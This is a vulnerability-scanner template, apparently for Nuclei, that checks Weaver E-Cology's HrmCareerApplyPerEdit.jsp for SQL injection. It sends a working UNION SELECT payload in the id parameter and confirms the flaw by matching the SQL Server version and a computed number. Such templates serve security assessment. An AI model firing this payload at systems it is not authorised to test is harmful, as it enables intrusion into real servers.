id: poc-yaml-e-cology-hrmcareerapplyperedit
info:
  name: 泛微OA E-Cology HrmCareerApplyPerEdit.jsp SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    SQL Injection vulnerability in 泛微OA E-Cology HrmCareerApplyPerEdit.jsp.

variables:
  t1: "{{rand_int(100,500)}}"
  t2: "{{to_number(t1) * to_number(t1) * to_number(t1)}}"

http:
  - method: GET
    path:
      - "{{BaseURL}}/pweb/careerapply/HrmCareerApplyPerEdit.jsp?id=1+union+select+1,2,@@version,POWER({{t1}},3),5,6,7"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "Microsoft SQL Server"
      - type: word
        part: body
        words:
          - "{{t2}}"
